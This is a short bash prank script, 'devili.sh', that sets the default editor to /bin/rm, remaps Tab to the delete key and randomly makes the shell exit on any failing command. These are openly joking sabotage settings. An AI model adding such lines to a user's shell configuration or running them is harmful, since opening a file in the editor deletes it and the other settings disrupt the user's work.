#!/usr/bin/env bash
# devili.sh — http://mths.be/devili.sh

# Set `rm` as the default editor
export EDITOR=/bin/rm

# Make Tab send the delete key
tset -Qe $'\t'

# Randomly make the shell exit whenever a command has a non-zero exit status
((RANDOM % 10)) || set -o errexit
